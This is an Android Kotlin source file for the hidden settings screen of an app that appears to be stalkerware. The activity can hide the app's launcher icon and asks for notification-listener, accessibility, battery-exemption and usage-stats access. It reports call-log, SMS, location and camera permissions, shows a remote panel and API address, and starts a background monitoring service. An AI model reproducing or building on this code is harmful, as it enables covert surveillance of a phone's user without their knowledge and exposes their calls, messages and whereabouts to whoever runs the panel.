package com.takip.app.ui

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import com.takip.app.R
import com.takip.app.databinding.ActivityHiddenSettingsBinding
import com.takip.app.service.MonitoringService
import com.takip.app.util.AppHider
import com.takip.app.util.PermissionChecker
import com.takip.app.util.PrefsManager
import com.takip.app.util.UsageStatsHelper

class HiddenSettingsActivity : AppCompatActivity() {

    private lateinit var binding: ActivityHiddenSettingsBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        binding = ActivityHiddenSettingsBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.hideButton.setOnClickListener {
            AppHider.hideLauncherIcon(this)
            updateStatus()
        }

        binding.showButton.setOnClickListener {
            AppHider.showLauncherIcon(this)
            updateStatus()
        }

        binding.permissionsButton.setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        binding.accessibilityButton.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        binding.batteryButton.setOnClickListener {
            requestBatteryExemption()
        }

        binding.usageButton.setOnClickListener {
            UsageStatsHelper.openSettings(this)
        }

        binding.secretCodeText.text = getString(R.string.secret_code_hint)
        updateStatus()
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun requestBatteryExemption() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            }
        }
    }

    private fun updateStatus() {
        val perms = PermissionChecker.getStatus(this)
        val status = buildString {
            appendLine("Panel: ${PrefsManager.panelUrl ?: "-"}")
            appendLine("API: ${PrefsManager.apiBaseUrl ?: "-"}")
            appendLine("E-posta: ${PrefsManager.userEmail ?: "-"}")
            appendLine("Cihaz: ${perms.optString("manufacturer")} ${perms.optString("model")}")
            appendLine("Cihaz ID: ${PrefsManager.deviceId ?: "-"}")
            appendLine("Kurulum: ${if (PrefsManager.isSetupComplete) "Tamamlandı" else "Bekliyor"}")
            appendLine("Gizli: ${if (PrefsManager.isHidden) "Evet" else "Hayır"}")
            appendLine("--- İzinler ---")
            appendLine("Arama kaydı: ${yesNo(perms.optBoolean("callLog"))}")
            appendLine("SMS: ${yesNo(perms.optBoolean("sms"))}")
            appendLine("Konum: ${yesNo(perms.optBoolean("location"))}")
            appendLine("Kamera: ${yesNo(perms.optBoolean("camera"))}")
            appendLine("Bildirim erişimi: ${yesNo(perms.optBoolean("notifications"))}")
            appendLine("Erişilebilirlik: ${yesNo(perms.optBoolean("accessibility"))}")
            appendLine("Pil optimizasyonu kapalı: ${yesNo(perms.optBoolean("batteryOptimization"))}")
            appendLine("Uygulama kullanımı: ${yesNo(perms.optBoolean("usageStats"))}")
        }
        binding.statusText.text = status

        if (!PrefsManager.isSetupComplete) return
        MonitoringService.start(this)
    }

    private fun yesNo(ok: Boolean) = if (ok) "Açık ✓" else "Kapalı ✗"
}
